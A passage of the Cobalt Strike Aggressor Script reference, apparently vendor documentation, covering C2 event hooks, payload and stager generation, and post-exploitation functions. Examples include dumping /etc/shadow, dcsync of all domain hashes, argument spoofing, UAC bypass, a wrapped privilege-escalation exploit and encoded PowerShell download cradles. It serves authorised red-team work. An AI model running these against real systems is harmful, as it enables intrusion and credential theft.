   println("\tTimestamp: $3");
}
disconnect
Fired when this Cobalt Strike becomes disconnected from the team server.

event_action
Fired when a user performs an action in the event log. This is similar to an action on IRC (the /me command)

Arguments
$1 - who the message is from

$2 - the contents of the message

$3 - the time the message was posted

event_beacon_initial
Fired when an initial beacon message is posted to the event log.

Arguments
$1 - the contents of the message

$2 - the time the message was posted

event_join
Fired when a user connects to the team server

Arguments
$1 - who joined the team server

$2 - the time the message was posted

event_newsite
Fired when a new site message is posted to the event log.

Arguments
$1 - who setup the new site

$2 - the contents of the new site message

$3 - the time the message was posted

event_notify
Fired when a message from the team server is posted to the event log.

Arguments
$1 - the contents of the message

$2 - the time the message was posted

event_nouser
Fired when the current Cobalt Strike client tries to interact with a user who is not connected to the team server.

Arguments
$1 - who is not present

$2 - the time the message was posted

event_private
Fired when a private message is posted to the event log.

Arguments
$1 - who the message is from

$2 - who the message is directed to

$3 - the contents of the message

$4 - the time the message was posted

event_public
Fired when a public message is posted to the event log.

Arguments
$1 - who the message is from

$2 - the contents of the message

$3 - the time the message was posted

event_quit
Fired when someone disconnects from the team server.

Arguments
$1 - who left the team server

$2 - the time the message was posted

heartbeat_10m
Fired every ten minutes

heartbeat_10s
Fired every ten seconds

heartbeat_15m
Fired every fifteen minutes

heartbeat_15s
Fired every fifteen seconds

heartbeat_1m
Fired every minute

heartbeat_1s
Fired every second

heartbeat_20m
Fired every twenty minutes

heartbeat_30m
Fired every thirty minutes

heartbeat_30s
Fired every thirty seconds

heartbeat_5m
Fired every five minutes

heartbeat_5s
Fired every five seconds

heartbeat_60m
Fired every sixty minutes

keylogger_hit
Fired when there are new results reported to the web server via the cloned site keystroke logger.

Arguments
$1 - external address of visitor

$2 - reserved

$3 - the logged keystrokes

$4 - the phishing token for these recorded keystrokes.

keystrokes
Fired when Cobalt Strike receives keystrokes

Arguments
$1 - a dictionary with information about the keystrokes.

Key   Value
bid   Beacon ID for session keystrokes originated from
data  keystroke data reported in this batch
id identifier for this keystroke buffer
session  desktop session from keystroke logger
title last active window title from keystroke logger
user  username from keystroke logger
when  timestamp of when these results were generated
Example
on keystrokes {
   if ("*Admin*" iswm $1["title"]) {
      blog($1["bid"], "Interesting keystrokes received. 
      Go to \c4View -> Keystrokes\o and look for the green buffer.");
      highlight("keystrokes", @($1), "good");
   }
}
profiler_hit
Fired when there are new results reported to the System Profiler.

Arguments
$1 - external address of visitor

$2 - de-cloaked internal address of visitor (or "unknown")

$3 - visitor's User-Agent

$4 - a dictionary containing the applications.

$5 - the phishing token of the visitor (use &tokenToEmail to resolve to an email address)

ready
Fired when this Cobalt Strike client is connected to the team server and ready to act.

screenshots
Fired when Cobalt Strike receives a screenshot.

Arguments
$1 - a dictionary with information about the screenshot.

Key   Value
bid   Beacon ID for session screenshot originated from
data  raw screenshot data (this is a .jpg file)
id identifier for this screenshot
session  desktop session reported by screenshot tool
title active window title from screenshot tool
user  username from screenshot tool
when  timestamp of when this screenshot was received
Example
# watch for any screenshots where someone is banking and
# redact it from the user-interface.
on screenshots {
   local('$title');
   $title = lc($1["title"]);  
   
   if ("*bankofamerica*" iswm $title) {
      redactobject($1["id"]);
   }
   else if ("jpmc*" iswm $title) {
      redactobject($1["id"]);
   }
}
sendmail_done
Fired when a phishing campaign completes

Arguments
$1 - the campaign ID

sendmail_post
Fired after a phish is sent to an email address.

Arguments
$1 - the campaign ID

$2 - the email we're sending a phish to

$3 - the status of the phish (e.g., SUCCESS)

$4 - the message from the mail server

sendmail_pre
Fired before a phish is sent to an email address.

Arguments
$1 - the campaign ID

$2 - the email we're sending a phish to

sendmail_start
Fired when a new phishing campaign kicks off.

Arguments
$1 - the campaign ID

$2 - number of targets

$3 - local path to attachment

$4 - the bounce to address

$5 - the mail server string

$6 - the subject of the phishing email

$7 - the local path to the phishing template

$8 - the URL to embed into the phish

ssh_checkin
Fired when an SSH client checkin acknowledgement is posted to an SSH console.

Arguments
$1 - the ID of the session

$2 - the text of the message

$3 - when this message occurred

ssh_error
Fired when an error is posted to an SSH console.

Arguments
$1 - the ID of the session

$2 - the text of the message

$3 - when this message occurred

ssh_indicator
Fired when an indicator of compromise notice is posted to an SSH console.

Arguments
$1 - the ID of the session

$2 - the user responsible for the input

$3 - the text of the message

$4 - when this message occurred

ssh_initial
Fired when an SSH session is seen for the first time.

Arguments
$1 - the ID of the session

Example
on ssh_initial {
   if (-isadmin $1) {
      bshell($1, "cat /etc/shadow");
   }
}
ssh_input
Fired when an input message is posted to an SSH console.

Arguments
$1 - the ID of the session

$2 - the user responsible for the input

$3 - the text of the message

$4 - when this message occurred

ssh_output
Fired when output is posted to an SSH console.

Arguments
$1 - the ID of the session

$2 - the text of the message

$3 - when this message occurred

ssh_output_alt
Fired when (alternate) output is posted to an SSH console. What makes for alternate output? It's just different presentation from normal output.

Arguments
$1 - the ID of the session

$2 - the text of the message

$3 - when this message occurred

ssh_tasked
Fired when a task acknowledgement is posted to an SSH console.

Arguments
$1 - the ID of the session

$2 - the text of the message

$3 - when this message occurred

web_hit
Fired when there's a new hit on Cobalt Strike's web server.

Arguments
$1 - the method (e.g., GET, POST)

$2 - the requested URI

$3 - the visitor's address

$4 - the visitor's User-Agent string

$5 - the web server's response to the hit (e.g., 200)

$6 - the size of the web server's response

$7 - a description of the handler that processed this hit.

$8 - a dictionary containing the parameters sent to the web server

$9 - the time when the hit took place.



Functions
The following is a list of Aggressor Script's functions:

ClosedJump to:
-hasbootstraphint
Check if a byte array has the x86 or x64 bootstrap hint. Use this function to determine if it's safe to use an artifact that passes GetProcAddress/GetModuleHandleA pointers to this payload.

Arguments
$1 - byte array with a payload or shellcode.

See also
&payload_bootstrap_hint

-is64
Check if a session is on an x64 system or not (Beacon only).

Arguments
$1 - Beacon/Session ID

Example
command x64 {
   foreach $session (beacons()) {
      if (-is64 $session['id']) {
         println($session);
      }
   }
}
Back to Top

-isactive
Check if a session is active or not. A session is considered active if (a) it has not acknowledged an exit message AND (b) it is not disconnected from a parent Beacon.

Arguments
$1 - Beacon/Session ID

Example
command active {
   local('$bid');
   foreach $bid (beacon_ids()) {
      if (-isactive $bid) {
         println("$bid is active!");
      }
   }
}
Back to Top

-isadmin
Check if a session has admin rights

Arguments
$1 - Beacon/Session ID

Example
command admin_sessions {
   foreach $session (beacons()) {
      if (-isadmin $session['id']) {
         println($session);
      }
   }
}
Back to Top

-isbeacon
Check if a session is a Beacon or not.

Arguments
$1 - Beacon/Session ID

Example
command beacons {
   foreach $session (beacons()) {
      if (-isbeacon $session['id']) {
         println($session);
      }
   }
}
Back to Top

-isssh
Check if a session is an SSH session or not.

Arguments
$1 - Beacon/Session ID

Example
command ssh_sessions {
   foreach $session (beacons()) {
      if (-isssh $session['id']) {
         println($session);
      }
   }
}
Back to Top

action
Post a public action message to the event log. This is similar to the /me command.

Arguments
$1 - the message

Example
action("dances!");
Back to Top

addTab
Create a tab to display a GUI object.

Arguments
$1 - the title of the tab

$2 - a GUI object. A GUI object is one that is an instance of javax.swing.JComponent.

$3 - a tooltip to display when a user hovers over this tab.

Example
$label = [new javax.swing.JLabel: "Hello World"];
addTab("Hello!", $label, "this is an example");
Back to Top

addVisualization
Register a visualization with Cobalt Strike.

Arguments
$1 - the name of the visualization

$2 - a javax.swing.JComponent object

Example
$label = [new javax.swing.JLabel: "Hello World!"];
addVisualization("Hello World", $label);
See also
&showVisualization

Back to Top

add_to_clipboard
Add text to the clipboard, notify the user.

Arguments
$1 - the text to add to the clipboard

Example
add_to_clipboard("Paste me you fool!");
Back to Top

alias
Creates an alias command in the Beacon console

Arguments
$1 - the alias name to bind to

$2 - a callback function. Called when the user runs the alias. Arguments are: $0 = command run, $1 = beacon id, $2 = arguments.

Example
alias("foo", {
   btask($1, "foo!");
});
Back to Top

alias_clear
Removes an alias command (and restores default functionality; if it existed)

Arguments
$1 - the alias name to remove

Example
alias_clear("foo");
Back to Top

all_payloads
Generates all of the stageless payloads (in x86 and x64) for all of the configured listeners. (also available in the UI menu under Payloads -> Windows Stageless Generate all Payloads)

Arguments
$1 - The folder path to create the payloads in.

$2 - A boolean value for whether the executable files should be signed.

$3 – A string value for the system call method. Valid values are:

None: Use the standard Windows API function.
Direct: Use the Nt* version of the function.

Indirect: Jump to the appropriate instruction within the Nt* version of the function.

$4 - (optional) The supporting HTTP library for generated beacons (wininet|winhttp|$null|blank string).

Example
$folder = all_payloads "/tmp/payloads", 1, "None");
println("Payloads have been saved to $folder");
Back to Top

applications
Returns a list of application information in Cobalt Strike's data model. These applications are results from the System Profiler.

Returns
An array of dictionary objects with information about each application.

Example
printAll(applications());
Back to Top

archives
Returns a massive list of archived information about your activity from Cobalt Strike's data model. This information is leaned on heavily to reconstruct your activity timeline in Cobalt Strike's reports.

Returns
An array of dictionary objects with information about your team's activity.

Example
foreach $index => $entry (archives()) {
   println("\c3( $+ $index $+ )\o $entry");
}
Back to Top

artifact
DEPRECATED This function is deprecated in Cobalt Strike 4.0. Use &artifact_stager instead.

Generates a stager artifact (exe, dll) from a Cobalt Strike listener

Arguments
$1 - the listener name

$2 - the artifact type

$3 - deprecated; this parameter no longer has any meaning.

$4 - x86|x64 - the architecture of the generated stager

Type  Description
dll   an x86 DLL
dllx64   an x64 DLL
exe   a plain executable
powershell  a powershell script
python   a python script
svcexe   a service executable
vbscript a Visual Basic script
Note
Be aware that not all listener configurations have x64 stagers. If in doubt, use x86.

Returns
A scalar containing the specified artifact.

Example
$data = artifact("my listener", "exe");

$handle = openf(">out.exe");
writeb($handle, $data);
closef($handle);
Back to Top

artifact_general
Generates a payload artifact from arbitrary shellcode.

Arguments
$1 - the shellcode

$2 - the artifact type

$3 - x86|x64 - the architecture of the generated payload

Type  Description
dll   a DLL
exe   a plain executable
powershell  a powershell script
python   a python script
svcexe   a service executable
Note
While the Python artifact in Cobalt Strike is designed to simultaneously carry an x86 and x64 payload; this function will only populate the script with the architecture argument specified as $3

Back to Top

artifact_payload
Generates a stageless payload artifact (exe, dll) from a Cobalt Strike listener name

Arguments
$1 - the listener name

$2 - the artifact type

$3 - x86|x64 - the architecture of the generated payload (stage)

$4 - exit method: 'thread' (leave the thread when done) or 'process' (exit the process when done). Use 'thread' if injecting into an existing process.

$5 – A string value for the system call method. Valid values are:

None: Use the standard Windows API function.
Direct: Use the Nt* version of the function.

Indirect: Jump to the appropriate instruction within the Nt* version of the function.

Type  Description
dll   a DLL
exe   a plain executable
powershell  a powershell script
python   a python script
raw   raw payload stage
svcexe   a service executable
$6 - (optional) The supporting HTTP library for generated beacons (wininet|winhttp|$null|blank string).

Note
While the Python artifact in Cobalt Strike is designed to simultaneously carry an x86 and x64 payload; this function will only populate the script with the architecture argument specified as $3

Example
$data = artifact_payload("my listener", "exe", "x86", “process”, “Indirect”);
Back to Top

artifact_sign
Sign an EXE or DLL file

Arguments
$1 - the contents of the EXE or DLL file to sign

Notes
This function requires that a code-signing certificate is specified in this server's Malleable C2 profile. If no code-signing certificate is configured, this function will return $1 with no changes.
DO NOT sign an executable or DLL twice. The library Cobalt Strike uses for code-signing will create an invalid (second) signature if the executable or DLL is already signed.
Returns
A scalar containing the signed artifact.

Example
# generate an artifact!
$data = artifact("my listener", "exe");

# sign it.
$data = artifact_sign($data);

# save it
$handle = openf(">out.exe");
writeb($handle, $data);
closef($handle);
Back to Top

artifact_stageless
DEPRECATED This function is deprecated in Cobalt Strike 4.0. Use &artifact_payload instead.

Generates a stageless artifact (exe, dll) from a (local) Cobalt Strike listener

Arguments
$1 - the listener name (must be local to this team server)

$2 - the artifact type

$3 - x86|x64 - the architecture of the generated payload (stage)

$4 - proxy configuration string

$5 - callback function. This function is called when the artifact is ready. The $1 argument is the stageless content.

Type  Description
dll   an x86 DLL
dllx64   an x64 DLL
exe   a plain executable
powershell  a powershell script
python   a python script
raw   raw payload stage
svcexe   a service executable
Notes
This function provides the stageless artifact via a callback function. This is necessary because Cobalt Strike generates payload stages on the team server.
The proxy configuration string is the same string you would use with Payloads -> Windows Stageless Payload. *direct* ignores the local proxy configuration and attempts a direct connection. protocol://user:[email protected]:port specifies which proxy configuration the artifact should use. The username and password are optional (e.g., protocol://host:port is fine). The acceptable protocols are socks and http. Set the proxy configuration string to $null or "" to use the default behavior. Custom dialogs may use &drow_proxyserver to set this.
This function cannot generate artifacts for listeners on other team servers. This function also cannot generate artifacts for foreign listeners. Limit your use of this function to local listers with stages only. Custom dialogs may use &drow_listener_stage to choose an acceptable listener for this function.
Note: while the Python artifact in Cobalt Strike is designed to simultaneously carry an x86 and x64 payload; this function will only populate the script with the architecture argument specified as $3
Example
sub ready {
   local('$handle');
   $handle = openf(">out.exe");
   writeb($handle, $1);
   closef($handle);
}

artifact_stageless("my listener", "exe", "x86", "", &ready);
Back to Top

artifact_stager
Generates a stager artifact (exe, dll) from a Cobalt Strike listener

Arguments
$1 - the listener name

$2 - the artifact type

$3 - x86|x64 - the architecture of the generated stager

Type  Description
dll   a DLL
exe   a plain executable
powershell  a powershell script
python   a python script
raw   the raw file
svcexe   a service executable
vbscript a Visual Basic script
Note
Be aware that not all listener configurations have x64 stagers. If in doubt, use x86.

Returns
A scalar containing the specified artifact.

Example
$data = artifact_stager("my listener", "exe", "x86");
 
$handle = openf(">out.exe");
writeb($handle, $data);
closef($handle);
Back to Top

barch
Returns the architecture of your Beacon session (e.g., x86 or x64)

Arguments
$1 - the id for the beacon to pull metadata for

Note
If the architecture is unknown (e.g., a DNS Beacon that hasn't sent metadata yet); this function will return x86.

Example
println("Arch is: " . barch($1));
Back to Top

bargue_add
This function adds an option to Beacon's list of commands to spoof arguments for.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the command to spoof arguments for. Environment variables are OK here too.

$3 - the fake arguments to use when the specified command is run.

Notes
The process match is exact. If Beacon tries to launch "net.exe", it will not match net, NET.EXE, or c:\windows\system32\net.exe. It will only match net.exe.
x86 Beacon can only spoof arguments in x86 child processes. Likewise, x64 Beacon can only spoof arguments in x64 child processes.
The real arguments are written to the memory space that holds the fake arguments. If the real arguments are longer than the fake arguments, the command launch will fail.
Example
# spoof cmd.exe arguments.
bargue_add($1, "%COMSPEC%", "/K \"cd c:\windows\temp & startupdatenow.bat\"");

# spoof net arguments
bargue_add($1, "net", "user guest /active:no");
Back to Top

bargue_list
List the commands + fake arguments Beacon will spoof arguments for.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

Example
bargue_list($1);
Back to Top

bargue_remove
This function removes an option to Beacon's list of commands to spoof arguments for.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the command to spoof arguments for. Environment variables are OK here too.

Example
# don't spoof cmd.exe
bargue_remove($1, "%COMSPEC%");
Back to Top

base64_decode
Unwrap a base64-encoded string

Arguments
$1 - the string to decode

Returns
The argument processed by a base64 decoder

Example
println(base64_decode(base64_encode("this is a test")));
Back to Top

base64_encode
Base64 encode a string

Arguments
$1 - the string to encode

Returns
The argument processed by a base64 encoder

Example
println(base64_encode("this is a test"));
Back to Top

bblockdlls
Launch child processes with binary signature policy that blocks non-Microsoft DLLs from loading in the process space.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - true or false; block non-Microsoft DLLs in child process

Note
This attribute is available in Windows 10 only.

Example
on beacon_initial {
   binput($1, "blockdlls start");
   bblockdlls($1, true);
}
Back to Top

bbrowser
Generate the beacon browser GUI component. Shows only Beacons.

Returns
The beacon browser GUI object (a javax.swing.JComponent)

Example
addVisualization("Beacon Browser", bbrowser());
See also
&showVisualization

Back to Top

bbrowserpivot
Start a Browser Pivot

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the PID to inject the browser pivot agent into.

$3 - the architecture of the target PID (x86|x64)

Example
bbrowserpivot($1, 1234, "x86");
Back to Top

bbrowserpivot_stop
Stop a Browser Pivot

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

Example
bbrowserpivot_stop($1);
Back to Top

bbypassuac
REMOVED Removed in Cobalt Strike 4.0.

Back to Top

bcancel
Cancel a file download

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the file to cancel or a wildcard.

Example
item "&Cancel Downloads" {
   bcancel($1, "*");
}
Back to Top

bcd
Ask a Beacon to change it's current working directory.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the folder to change to.

Example
# create a command to change to the user's home directory
alias home {
   $home = "c:\\users\\" . binfo($1, "user");
   bcd($1, $home);
}
Back to Top

bcheckin
Ask a Beacon to checkin. This is basically a no-op for Beacon.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

Example
item "&Checkin" {
   binput($1, "checkin");
   bcheckin($1);
}
Back to Top

bclear
This is the "oops" command. It clears the queued tasks for the specified beacon.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

Example
bclear($1);
Back to Top

bclipboard
Ask beacon to get the text clipboard contents.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

Example
bclipboard($1);
Back to Top

bconnect
Ask Beacon (or SSH session) to connect to a Beacon peer over a TCP socket

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the target to connect to

$3 - (optional) the port to use. Default profile port is used otherwise.

Note
Use &beacon_link if you want a script function that will connect or link based on a listener configuration.

Example
bconnect($1, "DC");
Back to Top

bcovertvpn
Ask Beacon to deploy a Covert VPN client.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the Covert VPN interface to deploy

$3 - the IP address of the interface [on target] to bridge into

$4 - (optional) the MAC address of the Covert VPN interface

Example
bcovertvpn($1, "phear0", "172.16.48.18");
Back to Top

bcp
Ask Beacon to copy a file or folder.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the file or folder to copy

$3 - the destination

Example
bcp($1, "evil.exe", "\\\\target\\C$\\evil.exe");
Back to Top

bdata
Get metadata for a Beacon session.

Arguments
$1 - the id for the beacon to pull metadata for

Returns
A dictionary object with metadata about the Beacon session.

Example
println(bdata("1234"));
Back to Top

bdata_store_list
List the post-ex items currently available in the data store.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

Example
bdata_store_list($1);
Back to Top

bdata_store_load
Load post-ex items to Beacon. This provides a mechanism to upload data and then query it via BOFs using APIs such as BeaconStoreGetItem().

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - item type [bof|dotnet|file]

$3 - file path

$4 - (optional) item name (If omitted, the file name is used).

Example
alias "data_store_load" {
    blog($1, "Loading data store...");
    bdata_store_load($1, "bof", "/home/someone/file.bof");
    bdata_store_load($1, "dotnet", "/home/someone/file.dotnet");
    bdata_store_load($1, "file", "/home/someone/file.data");
    blog($1, "Loaded data store...");
}
 
alias "data_store_load_with_name" {
    blog($1, "Loading data store with names...");
    bdata_store_load($1, "bof", "/home/someone/file.bof", "myBof");
    bdata_store_load($1, "dotnet", "/home/someone/file.dotnet", "myDotNet");
    bdata_store_load($1, "file", "/home/someone/file.data", "myData");
    blog($1, "Loaded data store with names...");
}
bdata_store_unload
Remove specific post-ex item from the store.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - index

Example
bdata_store_unload($1, parseNumber($2));
Back to Top

bdcsync
Use mimikatz's dcsync command to pull a user's password hash from a domain controller. This function requires a domain administrator trust relationship.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - fully qualified name of the domain

$3 - (optional) DOMAIN\user to pull hashes for

$4 - (optional) the PID to inject the dcsync command into or $null

$5 - (optional) the architecture of the target PID (x86|x64) or $null

Note
If $3 is left out, dcsync will dump all domain hashes.

Examples
Spawn a temporary process
# dump a specific account
bdcsync($1, "PLAYLAND.testlab", "PLAYLAND\\Administrator");

# dump all accounts
bdcsync($1, "PLAYLAND.testlab");
Inject into the specified process
# dump a specific account
bdcsync($1, "PLAYLAND.testlab", "PLAYLAND\\Administrator", 1234, "x64");
 
# dump all accounts
bdcsync($1, "PLAYLAND.testlab", $null, 1234, "x64");
Back to Top

bdesktop
Start a VNC session.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

Example
item "&Desktop (VNC)" {
   bdesktop($1); 
}
Back to Top

bdllinject
Inject a Reflective DLL into a process.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the PID to inject the DLL into

$3 - the local path to the Reflective DLL

Example
bdllinject($1, 1234, script_resource("test.dll"));
Back to Top

bdllload
Call LoadLibrary() in a remote process with the specified DLL.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the target process PID

$3 - the on-target path to a DLL

Note
The DLL must be the same architecture as the target process.

Example
bdllload($1, 1234, "c:\\windows\\mystuff.dll");
Back to Top

bdllspawn
Spawn a Reflective DLL as a Beacon post-exploitation job.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the local path to the Reflective DLL

$3 - a parameter to pass to the DLL

$4 - a short description of this post exploitation job (shows up in jobs output)

$5 - wait time for returned data specified in milliseconds (5000 = 5 seconds)

$6 - true/false; use impersonated token when running this post-ex job?

$7 - (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map

Notes
This function will spawn an x86 process if the Reflective DLL is an x86 DLL. Likewise, if the Reflective DLL is an x64 DLL, this function will spawn an x64 process.
A well-behaved Reflective DLL follows these rules:
Receives a parameter via the reserved DllMain parameter when the DLL_PROCESS_ATTACH reason is specified.
Prints messages to STDOUT
Calls fflush(stdout) to flush STDOUT
Calls ExitProcess(0) when done. This kills the spawned process to host the capability.
Example (ReflectiveDll.c)
This example is based on Stephen Fewer's Reflective DLL Injection Project:

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved ) {
   BOOL bReturnValue = TRUE;
   switch( dwReason ) {
      case DLL_QUERY_HMODULE:
         if( lpReserved != NULL )
            *(HMODULE *)lpReserved = hAppInstance;
         break;
      case DLL_PROCESS_ATTACH:
         hAppInstance = hinstDLL;
   
         /* print some output to the operator */
         if (lpReserved != NULL) {
            printf("Hello from test.dll. 
            Parameter is '%s'\n", (char *)lpReserved);
         }
         else {
            printf("Hello from test.dll. There is no parameter\n");
         }

         /* flush STDOUT */
         fflush(stdout);

         /* we're done, so let's exit */
         ExitProcess(0);
         break;
      case DLL_PROCESS_DETACH:
      case DLL_THREAD_ATTACH:
      case DLL_THREAD_DETACH:
         break;
   }
   return bReturnValue;
}
Example (Aggressor Script)
alias hello {
   bdllspawn($1, script_resource("reflective_dll.dll"), $2, 
   "test dll", 5000, false);
}
Back to Top

bdownload
Ask a Beacon to download a file

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the file to request

Example
bdownload($1, "c:\\sysprep.inf");
Back to Top

bdrives
Ask Beacon to list the drives on the compromised system

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

Example
item "&Drives" {
   binput($1, "drives");
   bdrives($1);
}
Back to Top

beacon_command_describe
Describe a Beacon command.

Returns
A string description of the Beacon command.

Arguments
$1 - the command

Example
println(beacon_command_describe("ls"));
Back to Top

beacon_command_detail
Get the help information for a Beacon command.

Returns
A string with helpful information about a Beacon command.

Arguments
$1 - the command

Example
println(beacon_command_detail("ls"));
Back to Top

beacon_command_register
Register help information for a Beacon command.

Arguments
$1 - the command

$2 - the short description of the command

$3 - the long-form help for the command.

Example
alis echo {
   blog($1, "You typed: " . substr($1, 5));
}

beacon_command_register(
   "echo", 
   "echo text to beacon log", 
   "Synopsis: echo [arguments]\n\nLog arguments to the beacon console");
Back to Top

beacon_commands
Get a list of Beacon commands.

Returns
An array of Beacon commands.

Example
printAll(beacon_commands());
Back to Top

beacon_data
Get metadata for a Beacon session.

Arguments
$1 - the id for the beacon to pull metadata for

Returns
A dictionary object with metadata about the Beacon session.

Example
println(beacon_data("1234"));
Back to Top

beacon_elevator_describe
Describe a Beacon command elevator exploit

Returns
A string description of the Beacon command elevator

Arguments
$1 - the exploit

Example
println(beacon_elevator_describe("uac-token-duplication"));
See Also
&beacon_elevator_register, &beacon_elevators, &belevate_command

Back to Top

beacon_elevator_register
Register a Beacon command elevator with Cobalt Strike. This adds an option to the runasadmin command.

Arguments
$1 - the exploit short name

$2 - a description of the exploit

$3 - the function that implements the exploit ($1 is the Beacon ID, $2 the command and arguments)

Example
# Integrate schtasks.exe (via SilentCleanup) Bypass UAC attack
# Sourced from Empire: https://github.com/EmpireProject/Empire/tree/master/data/module_source/privesc
sub schtasks_elevator {
   local('$handle $script $oneliner $command');

   # acknowledge this command
   btask($1, "Tasked Beacon to execute $2 in a high integrity context", "T1088");

   # read in the script
   $handle = openf(getFileProper(script_resource("modules"), "Invoke-EnvBypass.ps1"));
   $script = readb($handle, -1);
   closef($handle);

   # host the script in Beacon
   $oneliner = beacon_host_script($1, $script);

   # base64 encode the command
   $command  = transform($2, "powershell-base64");

   # run the specified command via this exploit.
   bpowerpick!($1, "Invoke-EnvBypass -Command \" $+ $command $+ \"", $oneliner);
}

beacon_elevator_register("uac-schtasks", "Bypass UAC with schtasks.exe (via SilentCleanup)", &schtasks_elevator);
See Also
&beacon_elevator_describe, &beacon_elevators, &belevate_command

Back to Top

beacon_elevators
Get a list of command elevator exploits registered with Cobalt Strike.

Returns
An array of Beacon command elevators

Example
printAll(beacon_elevators());
See also
&beacon_elevator_describe, &beacon_elevator_register, &belevate_command

Back to Top

beacon_execute_job
Run a command and report its output to the user.

Arguments
$1 - the Beacon ID

$2 - the command to run (environment variables are resolved)

$3 - the command arguments (environment variables are not resolved).

$4 - flags that change how the job is launched (e.g., 1 = disable WOW64 file system redirection)

Notes
The string $2 and $3 are combined as-is into a command line. Make sure you begin $3 with a space!
This is the mechanism Cobalt Strike uses for its shell and powershell commands.
Example
alias shell {
   local('$args');
   $args = substr($0, 6);
   btask($1, "Tasked beacon to run: $args", "T1059");
   beacon_execute_job($1, "%COMSPEC%", " /C $args", 0);
}
Back to Top

beacon_exploit_describe
Describe a Beacon exploit

Returns
A string description of the Beacon exploit

Arguments
$1 - the exploit

Example
println(beacon_exploit_describe("ms14-058"));
See Also
&beacon_exploit_register, &beacon_exploits, &belevate

Back to Top

beacon_exploit_register
Register a Beacon privilege escalation exploit with Cobalt Strike. This adds an option to the elevate command.

Arguments
$1 - the exploit short name

$2 - a description of the exploit

$3 - the function that implements the exploit ($1 is the Beacon ID, $2 is the listener)

Example
# Integrate windows/local/ms16_016_webdav from Metasploit
# https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms16_016_webdav.rb

sub ms16_016_exploit {
   local('$stager');
   
   # check if we're on an x64 system and error out.
   if (-is64 $1) {
      berror($1, "ms16-016 exploit is x86 only");
      return;
   }

   # acknowledge this command
   btask($1, "Task Beacon to run " . listener_describe($2) . " via ms16-016", "T1068");

   # generate our shellcode
   $stager = payload($2, "x86");

   # spawn a Beacon post-ex job with the exploit DLL
   bdllspawn!($1, getFileProper(script_resource("modules"), "cve-2016-0051.x86.dll"), $stager, "ms16-016", 5000);

   # link to our payload if it's a TCP or SMB Beacon
   beacon_link($1, $null, $2);
}

beacon_exploit_register("ms16-016", "mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)", &ms16_016_exploit);
See Also
&beacon_exploit_describe, &beacon_exploits, &belevate

Back to Top

beacon_exploits
Get a list of privilege escalation exploits registered with Cobalt Strike.

Returns
An array of Beacon exploits.

Example
printAll(beacon_exploits());
See also
&beacon_exploit_describe, &beacon_exploit_register, &belevate

Back to Top

beacon_host_imported_script
Locally host a previously imported PowerShell script within Beacon and return a short script that will download and invoke this script.

Arguments
$1 - the id of the Beacon to host this script with.

Returns
A short PowerShell script to download and evaluate the previously script when run. How this one-liner is used is up to you!

Example
alias powershell {
   local('$args $cradle $runme $cmd');
   
   # $0 is the entire command with no parsing.
   $args   = substr($0, 11);
   
   # generate the download cradle (if one exists) for an imported PowerShell script
   $cradle = beacon_host_imported_script($1);
   
   # encode our download cradle AND cmdlet+args we want to run
   $runme  = base64_encode( str_encode($cradle . $args, "UTF-16LE") );
   
   # Build up our entire command line.
   $cmd    = " -nop -exec bypass -EncodedCommand \" $+ $runme $+ \"";
   
   # task Beacon to run all of this.
   btask($1, "Tasked beacon to run: $args", "T1086");
   beacon_execute_job($1, "powershell", $cmd, 1);
}
Back to Top

beacon_host_script
Locally host a PowerShell script within Beacon and return a short script that will download and invoke this script. This function is a way to run large scripts when there are constraints on the length of your PowerShell one-liner.

Arguments
$1 - the id of the Beacon to host this script with.

$2 - the script data to host.

Returns
A short PowerShell script to download and evaluate the script when run. How this one-liner is used is up to you!

Example
alias test {
   local('$script $hosted');
   $script = "2 + 2";
   $hosted = beacon_host_script($1, $script);
   
   binput($1, "powerpick $hosted");
   bpowerpick($1, $hosted);
}
Back to Top

beacon_ids
Get the ID of all Beacons calling back to this Cobalt Strike team server.

Returns
An array of beacon IDs

Example
foreach $bid (beacon_ids()) {
   println("Bid: $bid");
}
Back to Top

beacon_info
Get information from a Beacon session's metadata.

Arguments
$1 - the id for the beacon to pull metadata for

$2 - the key to extract

Returns
A string with the requested information.

Example
println("User is: " . beacon_info("1234", "user"));
println("PID  is: " . beacon_info("1234", "pid"));
Back to Top

beacon_inline_execute
Execute a Beacon Object File

Arguments
$1 - the id for the Beacon

$2 - a string containing the BOF file

$3 - the entry point to call

$4 - packed arguments to pass to the BOF file

$5 - (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map

Note
The Cobalt Strike documentation has a page specific to BOF files. See Beacon Object Files.

Example (hello.c)
/*
* Compile with:
* x86_64-w64-mingw32-gcc -c hello.c -o hello.x64.o
* i686-w64-mingw32-gcc -c hello.c -o hello.x86.o
*/

#include "windows.h"
#include "stdio.h"
#include "tlhelp32.h"
#include "beacon.h"

void demo(char * args, int length) {
   datap  parser;
   char * str_arg;
   int    num_arg;
   
   BeaconDataParse(&parser, args, length);
